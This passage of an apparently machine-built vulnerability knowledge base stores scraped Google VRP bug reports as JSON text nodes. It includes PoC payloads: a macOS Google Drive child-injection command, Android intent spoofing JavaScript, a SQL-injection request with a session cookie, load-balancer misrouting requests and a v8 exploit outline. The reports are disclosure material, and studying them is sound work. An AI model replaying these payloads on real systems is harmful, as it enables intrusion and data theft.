same\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1983\r\nSince i was thinking from the view of Firebase, milaGGL pointed out that the bug was not reproducible so I edited my PR to remove the unnecessary code. I was unable to convey my message that it was exploitable when this library was used directly without any wrappers like nodejs firebase admin sdk library\r\nAnother developer reverts my commit to change the code to match exactly my original Pull request here\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1989/commits/7b8a9755bde1b86172fc65f810a54d0f1d0c82e1\r\n[ it reverts my commit and is totally same to my original PR ] in this\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1989\r\nHe has reviewed my PR and has reintroduced the code with the correct toJSON function spelling like i had suggested in my original PR and which was my original intention\r\nThis contribution was a security related one which is why i am filing it here\r\nI hope you understand how my contribution lead to the current state of the corrected code, I request you to review this and assign a CVE ID which also includes links to my PR so i can cite it.\r\nI would also like to argue my case for a bounty since the this concept was originally pioneered and raised by me\r\nAttack scenario\r\nThe vulnerability that was fixed eventually closed a loophole which leaked or exposed the private key using which the google cloud firestore nodejs-sdk library was initialised upon logging of any firestore objects like document snapshots, references, etc when serialised using JSON.stringify\r\nThe wrong spelling of toJSON as toJson in the original codebase state meant that the function toJson which was written to prevent serialisation of the firestore private key did not get triggered if JSON.stringify was run upon it\r\nI raised a PR to fix this and it is fixed now\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2763, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "adff1f21-3f0f-4b50-8346-9f29de097fed": {"__data__": {"id_": "adff1f21-3f0f-4b50-8346-9f29de097fed", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.txt", "file_name": "20250408_175645_174735.txt", "file_type": "text/plain", "file_size": 3358, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4e6c12d6-02d1-462d-ad20-be31f3fdeb15", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.txt", "file_name": "20250408_175645_174735.txt", "file_type": "text/plain", "file_size": 3358, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7c7d38b575823fae32ca4989bc0f6e93f8e9839b89c12a79c0c2830a88a6e9a1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nChild Injection in Google Drive macOS app allows to abuse Google Drive app to escalate TCC permissions\r\nGoogle VRP\r\ntriaged\r\n23:48 | Feb 1, 2024\r\naccepted\r\n06:38 | Feb 4, 2024\r\nfixed\r\n16:00 | May 5, 2024\r\nSummary:\r\nChild Injection in Google Drive macOS app allows to abuse Google Drive app to escalate TCC permissions\r\nProduct:\r\nGoogle Drive\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nContext\r\nIn macOS a process is considered a security boundary. This is why macOS implements several defense mechanisms that prevent even processes from the same user (or from root) to be able to inject code in a different process.\r\nThis is done because executables can have extra permissions via entitlements or can manage sensitive information inside of it.\r\nHowever, these privileges are usually inherited by processes created by the application. This means that if an application has a privileged entitlement or has been grantes some TCC permissions, any process created by that application will also have that entitlement.\r\nIt was found that the\r\nGoogle Drive\r\napplication is vulnerable to Child Process injection. This means that an attacker could inject a child in the Google Drive application and abuse those entitlements to access to the user's sensitive information.\r\nImpact\r\nThe\r\nGoogle Drive\r\napplication has an entitlement to request access to the users Photos:\r\ncom.apple.security.personal-information.photos-library\r\n.\r\nThis means that an attacker could inject a child in the Google Drive application and abuse that entitlement to access to the user's photos.\r\nNote that access to that resource might prompt a dialog to the user asking for permission. However, the user might not suspect that the application requesting access is\r\nGoogle Drive\r\nand grant the access. Or if the user already used\r\nGoogle Drive\r\nbefore, the user might have already granted access to those permissions to\r\nGoogle Drive\r\nand the dialog won't be prompted again.\r\nMoreover, a malicious application could also abuse the child injection in the application to make\r\nGoogle Drive\r\nrequest acccess to other TCC protected resources like Desktop or Documents so the user doesn't suspect and then abuse the granted access through\r\nGoogle Drive\r\nto access those resources.\r\nOther CVEs\r\nThese other CVEs were assigned to apps with a similar vulnerability:\r\nhttps://wojciechregula.blog/post/how-to-rob-a-firefox/\r\nhttps://github.com/Zeyad-Azima/CVE-2023-26818\r\nPoC\r\nThe following PoC makes Google Drive launch an iTerm2 terminal with it's privileges. This means that the iTerm2 terminal will have the same privileges as Google Drive, including the\r\ncom.apple.security.personal-information.photos-library\r\nentitlement.\r\nAn attacker could abuse this to execute a backdoor instead of a terminal.\r\nopen -a \"Google Drive\" --args --debugger_command \"/Applications/iTerm.app/Contents/MacOS/iTerm2\"\r\nA video showing this was attached.\r\nDisclaimer\r\nThis proposed vulnerability is part of a research that will be potentially presented in some cybersecurity conference(s).\r\nAttack scenario\r\nAnyone with access to a macOS computer can abuse the Google Drive application to access whatever Google Drive has access to, or to make Google Drive ask for permissions and then abuse those permissions once granted.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3342, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1ca5b965-e735-4ba2-b0d9-c61ec0b724a9": {"__data__": {"id_": "1ca5b965-e735-4ba2-b0d9-c61ec0b724a9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.txt", "file_name": "20250408_175647_290088.txt", "file_type": "text/plain", "file_size": 2646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1fa24f1e-a3cc-4a19-b774-5389fd9ac055", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.txt", "file_name": "20250408_175647_290088.txt", "file_type": "text/plain", "file_size": 2646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "88142b3d1d66f464a138eeefd8cb028e76477f579e97bec8e0b996d4e6e30acc", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nWeb app install spoof via intent\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n15:14 | Jan 24, 2024\r\naccepted\r\n18:24 | Jan 24, 2024\r\ntriaged\r\n16:34 | Mar 7, 2024\r\naccepted\r\n22:52 | Mar 7, 2024\r\ntriaged\r\n05:46 | Mar 12, 2024\r\naccepted\r\n17:34 | Mar 18, 2024\r\nfixed\r\n20:38 | Jul 6, 2024\r\nreward decided\r\n$1,125\r\nSummary:\r\nWeb app install spoof via intent\r\nProduct:\r\nGoogle\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSecurity UI Spoofing\r\nDetails\r\nThe following has been forwarded from\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1520159\r\nas requested by [REDACTED_EMAIL] \"get me cc'd on them so I can help provide context\"\r\nOn an android device run the following code on any website then click on the page.\r\nonclick = () => {\r\n location.href='intent://search.app.goo.gl/?link=\r\nhttps://www.google.com/hsi?name%3DChrome%26icon%3Dhttps://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png%26ve%3D145828%26hv%3D1%26dest%3D1%26source%3Dhomescreen_shortcut%26query%3Dhttps%3A%2F%2Fndev.tk%23Intent;scheme%3Dhttps;package%3Dcom.google.android.googlequicksearchbox;end&apn=com.google.android.googlequicksearchbox#Intent;package=com.google.android.gms;scheme=https;end;'\r\nlocation.href='\r\nhttps://www.google.com'\r\n;\r\n}\r\nIts also possible to skip the add to home screen step like this: (Sandboxed main frame escape)\r\nintent://\r\nwww.google.com/gasearch?q=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end\r\nA fix would need to cover both firebase (com.google.android.gms) and using the intent directly.\r\nAttack scenario\r\nPlease see video for PoC :)\r\nFrom any website:\r\nNo origin is displayed on the install prompt and the icon is chosen by the attacker, attacker controlled page is shown in a google app webview (seems to work differently then a normal page load)\r\nThe origin\r\nhttps://www.google.com\r\nwas shown before a prompt was given.\r\nIt seems strange that  browser intents cant be origin scoped like stuff for google does not need to be allowed for every site, maybe that could change.\r\nSome quotes:\r\n\"It does seem like this has spoof potential\"\r\n\"The shortcut spoof is probably also low sev, but definitely something that should be fixed as I see no reason for google search app to be allowing untrusted sites to request shortcut install (even if non-malicious) on link click.\r\nIn any case, neither of these issues are fixable in Chrome (short of blocklisting google search app), and should be reported to the google search app.\"\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2630, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "39dfe8f4-67ea-46b7-a46a-0e84af8ac29f": {"__data__": {"id_": "39dfe8f4-67ea-46b7-a46a-0e84af8ac29f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.txt", "file_name": "20250408_175647_325985.txt", "file_type": "text/plain", "file_size": 2022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1e533b1d-7938-4e8b-95d8-89738d2a994e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.txt", "file_name": "20250408_175647_325985.txt", "file_type": "text/plain", "file_size": 2022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "92dd82aca5c00ed400d8e5b0f09eb3a4951d5eebb7c9f9a46efc7518b6f0a00d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSQL injection on https://www.pacoapp.com\r\nReported by:\r\nMohamed Zain\r\nGoogle VRP\r\ntriaged\r\n17:40 | Dec 6, 2023\r\naccepted\r\n23:23 | Dec 12, 2023\r\nfixed\r\n07:55 | Dec 22, 2023\r\nSummary:\r\nSQL injection on\r\nhttps://www.pacoapp.com\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/google/paco\r\nVulnerability type:\r\nSQL Injection (SQLi)\r\nDetails\r\nHello team\r\ni found this sql injection on json\r\ndatabase is pacodb  and version is 5.7.44-google-log\r\nin screen sleep i used sleep() -> see the time in image\r\nPOST /csSearch?pacoProtocol=5 HTTP/2\r\nHost: www.pacoapp.com\r\nCookie: SACSID=~AJKiYcEQQ1KnCajhnZoIoYn1RB6CUlwjNvdoXjnZDIVWSFlQpN7J8SpzkhwyAOMl2zyyRatQWd6dEmszcio8eDPn1BFatpVtb9SFeG3xklB4K-rlq0qbaVFlgr96a0XdsoDj0mfkzLGHHHY6gJy-Rmlx7Aliqsipao1guOvqmuPYpSy88dVNQdoxDq1Q-f_MNw29RkQzkPyuIUEVC5RWAOX_Daggr7hl5gvDeHsoQMnaajRsnKR9Tn_kbhQ9JMrNyqME6WM-s92EYZXaAsLaolw_4bBjh-JtzRzIE_uWO4OaAtTyEiP8QnJ9XKWWEVFUiCeo7j8U7j0-qpipOhHM1GUm3b_PTON2f3DSuleQMco5YeiIOdWyHjm0EFOyX6Ewuj-40umTn5y4FTC8Knd2dL758i_G38pLSQ\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAccept: application/json, text/plain, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nPacoprotocol: 4\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: 165\r\nOrigin: https://www.pacoapp.com\r\nReferer: https://www.pacoapp.com/\r\nSec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\nTe: trailers\r\n\r\n{\"select\":[\"database()\"],\"query\":{\"criteria\":\"experiment_id = ? and response_time is not null\",\"values\":[4939133602758656]},\"order\":\"response_time desc\",\"limit\":\"1\"}\r\nAttack scenario\r\ncan allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2006, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fe8301b6-dd5d-4230-a275-3770863810e0": {"__data__": {"id_": "fe8301b6-dd5d-4230-a275-3770863810e0", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.txt", "file_name": "20250408_175647_369037.txt", "file_type": "text/plain", "file_size": 2822, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "30980c54-9bb4-40fa-b53d-0f2f50ee0925", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.txt", "file_name": "20250408_175647_369037.txt", "file_type": "text/plain", "file_size": 2822, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "43fac2fdb4c01260e916d98988a86f4c44dd2bb867ecc3e422be71c40135f978", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nFirestore private key leaked by using JSON.stringify on any firestore object in Node.JS\r\nReported by:\r\nAbhishek Mathur\r\nGoogle VRP\r\ntriaged\r\n01:06 | Nov 28, 2023\r\naccepted\r\n22:53 | Dec 6, 2023\r\ntriaged\r\n16:55 | Jan 25, 2024\r\nfixed\r\n16:57 | Jan 25, 2024\r\nreward decided\r\n$500\r\nSummary:\r\nFirestore private key leaked by using JSON.stringify on any firestore object in Node.JS\r\nProduct:\r\nFirebase\r\nURL:\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1742\r\nVulnerability type:\r\nunknown\r\nDetails\r\n[ The bug has been fixed via my pull request, I just want a CVE ID for the fixed vulnerability ] and any bug bounty reward if eligible, \r\nPR :\r\nhttps://github.com/googleapis/nodejs-firestore/pull/1742\r\nI discovered that when i serialise any firebase admin sdk nodejs-> firestore object, it was leaking the entire private key that i was using to initialise the SDK \r\n(\r\nhttps://firebase.google.com/docs/reference/admin/node/firebase-admin.app#example_2\r\n)\r\nthis was happening because of the non-protection of settings field inside firestore object, and this firestore object is present inside all other objects like documents, collections, references, etc\r\nEg: If we are logging the objects in our codebase for debugging using JSON.stringify the prod firebase project logs will contain the serialised firestore objects revealing the private key in logs like Google Cloud StackDriver logging, which is unintended as the person having logging view rights might not be authorised or intended to have access to prod firestore private key\r\nUpon my suggestion the bug is fixed and PR is merged, i would like a CVE ID number for this vulnerability i helped to fix and also any bug bounty reward if eligible.\r\nAttack scenario\r\nIt can be exploited by anybody who can see the output of serialization of firestore obejcts, For Example, Any developers in an organisation who have Google Cloud Stackdriver logs view only rights, so suppose if the code serialises any firestore objects for debugging ( document id, collection path , etc) the logs will also contain private key used to manually initialise firestore as described in this example\r\nhttps://firebase.google.com/docs/reference/admin/node/firebase-admin.app#example_2\r\nand they will be able to see prod firebase firestore key which the organisation or project owners might not be wanting to for security reasons. Also prod key of any database should never be revealed by any serialisation technique on any database , library or ORM generated objects as the code may be passing credentials via env or some secret manager and the serialised data on database objects may be stored inside database to be shown to user or be put inside logs ( so that developers can see and debug any prod issues)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2806, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "45ac56f2-6645-49ff-aa03-54dec9754be6": {"__data__": {"id_": "45ac56f2-6645-49ff-aa03-54dec9754be6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c526a67d24060491d8e9ccb0dc7520da0cf16874edaaf9707da32e4ff4b4bcdf", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "ea8230f8-6322-437c-92bc-5038e1f5cb25", "node_type": "1", "metadata": {}, "hash": "ed4a75288b54bea09a2890b7009eac16d1e02e987d89ddb4c2b9af501345546a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nA 0 day misrouting vulnerability was found affecting all gcp load balancers that serve content from a backend bucket by default.\r\nReported by:\r\nMohamed Mahmoudi\r\nGoogle VRP\r\ntriaged\r\n03:10 | Nov 10, 2023\r\naccepted\r\n08:36 | Nov 10, 2023\r\nfixed\r\n23:58 | Sep 20, 2024\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nA 0 day misrouting vulnerability was found affecting all gcp load balancers that serve content from a backend bucket by default.\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://console.cloud.google.com/net-services/loadbalancing\r\nVulnerability type:\r\nOther\r\nDetails\r\nI have discovered this vullnerability through fuzzing on a bug bounty session. I have found over 5000 instances that returned a response indicating the actual name of the bucket. Here is an example, we\u2019ll use the website web1-dev.vellum-stg.sc-corp.net which is a vulnerable load balancer instance I found in the wild:\r\nRequest:\r\nGET @fuzz/ HTTP/1.1\r\nHost: web1-dev.vellum-stg.sc-corp.net\r\nConnection: close\r\nResponse:\r\n<?xml version='1.0' encoding='UTF-8'?><Error><Code>InvalidBucketName</Code><Message>The specified bucket is not valid.</Message><Details>Invalid bucket name: 'vellum-sc-backend-bucket-for-protection@fuzz'</Details></Error>\r\nThis error discloses the real name of the bucket behind the load balancer:\r\nvellum-sc-backend-bucket-for-protection\r\nscreenshot: fuzzing.png\r\nAfter ananlysing this behaviour, I came to the understanding that the load balancer by default concatenates whatever comes before the \u201c/\u201c in the path with the actual name of the bucket.\r\nTo my understanding, the request sent from the load balancer to the storage endpoint might look like the following:\r\nGET vellum-sc-backend-bucket-for-protection@fuzz/ HTTP/1.1\r\nHost: storage.googleapis.com\r\nConnection: close\r\nThis would mean that misrouting the request to any bucket whose name starts with\r\nvellum-sc-backend-bucket-for-protection\r\nis possible. To confirm this, I have created a storage bucket on my account with the same bucket named + \"-pwn\" suffix. So my bucket would be named: vellum-sc-backend-bucket-for-protection-pwn.\r\nI have uploaded an index.html to my bucket and sent the following malformed request to the vulnerable load balancer:\r\nGET -pwn/index.html HTTP/1.1\r\nHost: web1-dev.vellum-stg.sc-corp.net\r\nAs expected, the load balancer returned the content of my bucket in the response instead of throwing an error.\r\nscreenshot: -pwn:index.png\r\nPOC\r\nTo confirm that this vulnerability originates from google and not a misconfiguration from the client side, I have followed this tutorial\r\nhttps://cloud.google.com/load-balancing/docs/https/ext-load-balancer-backend-buckets\r\nto create:\r\nBucket A: \"misrouting-vulnerability\"\r\nBucket B: \"misrouting-vulnerability-private\"\r\nA load balancer configured by default to serve content from bucket A as backend. Address:\r\nhttp://34.107.180.11\r\nHost, Path rules are left to default.\r\nSteps\r\nSend the following request to\r\nhttp://34.107.180.11\r\nGET /index.html HTTP/1.1\r\nHost: 34.107.180.11\r\nConnection: close\r\nNotice \"Yuhuu\" returned in the respone.\r\nscreenshot: mybucket.png\r\nThen send the following request:\r\nGET -private/index.html HTTP/1.1\r\nHost: 34.107.180.11\r\nConnection: close\r\nAnd notice the response changing to \"POC\".\r\nscreenshot: -private:index.png\r\nPS: If the content does not show immediately, send the request multiple times until you see the designated response.\r\nAttack scenario\r\nDisclosure of the bucket name\r\n: While the bucket name could be considered public information, clients do not expect load balancers to disclose the name of the bucket with error messages. This could allow attackers to conduct further attacks directly on the bucket without having to pass through the load balancer or any firewalls that might be put in place.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3804, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ea8230f8-6322-437c-92bc-5038e1f5cb25": {"__data__": {"id_": "ea8230f8-6322-437c-92bc-5038e1f5cb25", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c526a67d24060491d8e9ccb0dc7520da0cf16874edaaf9707da32e4ff4b4bcdf", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "45ac56f2-6645-49ff-aa03-54dec9754be6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1d822c30e176a6d139ec449ae2fb5d0778cbb3baea08f596b14d940f9619f6ea", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "screenshot: mybucket.png\r\nThen send the following request:\r\nGET -private/index.html HTTP/1.1\r\nHost: 34.107.180.11\r\nConnection: close\r\nAnd notice the response changing to \"POC\".\r\nscreenshot: -private:index.png\r\nPS: If the content does not show immediately, send the request multiple times until you see the designated response.\r\nAttack scenario\r\nDisclosure of the bucket name\r\n: While the bucket name could be considered public information, clients do not expect load balancers to disclose the name of the bucket with error messages. This could allow attackers to conduct further attacks directly on the bucket without having to pass through the load balancer or any firewalls that might be put in place.\r\nAbility to communicate custom responses to load balancers\r\n: Threat actors could set their buckets to return custom headers starting with \u201cx-goog-meta-key\u201d in the response returned by their bucket through a command like the following:\r\ngsutil setmeta -h \"x-goog-meta-redirect-url:https://www.google.com\" gs://vellum-sc-backend-bucket-for-protection-pwn/index.html\r\nThose same headers will be reflected in the response of the misrouted request. If the load balancer has custom rules for dealing with such headers(redirection, cache..), attackers could tamper with their values through the issue discussed in this report.\r\nscreenshot: cloudshell headers.png\r\nscreenshot: custom headers.ong\r\nRisk of leakage of information through the logs\r\n: The requests sent by load balancers to the buckets could be found in the threat actor's access logs:\r\nhttps://cloud.google.com/storage/docs/access-logs\r\n. \r\nIf the load balancer is configured to send sensitive data especially in the url of the request(such as private keys or url signatures), the attacker would be able to access this information by enabling and inspecting their exploit bucket access logs.\r\nResource exhaustion\r\n: The load balancer data transfer usage is billed per GiB:\r\nhttps://cloud.google.com/vpc/network-pricing#lb\r\n. Attackers could host large files on their own buckets and abuse their target\u2019s load balancer to fetch them. This could lead to important extra charges for the client or complete denial of service in some cases.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3101, "end_char_idx": 5317, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8920fceb-b70a-4fdd-87ca-3a2ddcee4333": {"__data__": {"id_": "8920fceb-b70a-4fdd-87ca-3a2ddcee4333", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.txt", "file_name": "20250408_175647_450260.txt", "file_type": "text/plain", "file_size": 1641, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6574cb40-9ac3-49ad-9751-81c00736ac61", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.txt", "file_name": "20250408_175647_450260.txt", "file_type": "text/plain", "file_size": 1641, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1e9aa5b01e0c0ac096e74a18f0089b8bc991bd3c387e73d8a8ae57101c75a0c1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nv8CTF submission 45ff096edfe1\r\nReported by:\r\nmadStacks\r\nGoogle VRP\r\naccepted\r\n22:06 | Oct 26, 2023\r\nfixed\r\n23:47 | Oct 30, 2023\r\nreward decided\r\n$10,000\r\nVulnerability\r\nThis is an n-day exploit based on chromium\r\nissue 1472121\r\n, which still has its report closed. I found it by looking through the v8 commit history (\r\nhttps://github.com/v8/v8/commit/10b0e62e7059a29e4c23b3e041c5da87983f22bc\r\n). The commit also has a regression test that I was able to use to trigger the vulnerability and achieve an OOB write.\r\nExploit\r\nThe steps for the exploit are:\r\nUse the vulnerability to modify v8 heap objects to achieve read, write, and addr_of primitives within the sandbox\r\nLoad WebAssembly with useful gadgets for ROP (done by using mov instructions with constants that are encoded instructions) that we can leak the addresses for from the WasmInstance object\r\nCreate a byte array with the final x86 payload to run\r\nCreate and modify v8 bytecode to take control of rsp/rbp\r\nUse our controlled stack to ROP and copy the byte array to the Wasm rwx page and execute\r\nThe only address that I needed to leak was the wasm rwx page, which has a 64 bit pointer inside the sandbox\r\nAttached files\r\nThe entire exploit is written in 1472121_min.js, and is called by 1472121.html with some useful helper functions. Other files are included to help with testing:\r\ntest.wat: the WebAssembly code to generate ROP gadgets\r\ntest.wasm: compiled WebAssembly used in exploit\r\nserver.py: useful for running https\r\nDownload\r\nexploit.tag.gz\r\ncontaining the above mentioned files.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1625, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7af79901-0e8d-47da-95ba-214122fbc194": {"__data__": {"id_": "7af79901-0e8d-47da-95ba-214122fbc194", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", "file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b364a1bd-be12-4360-8a87-6afe2ec8003c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", 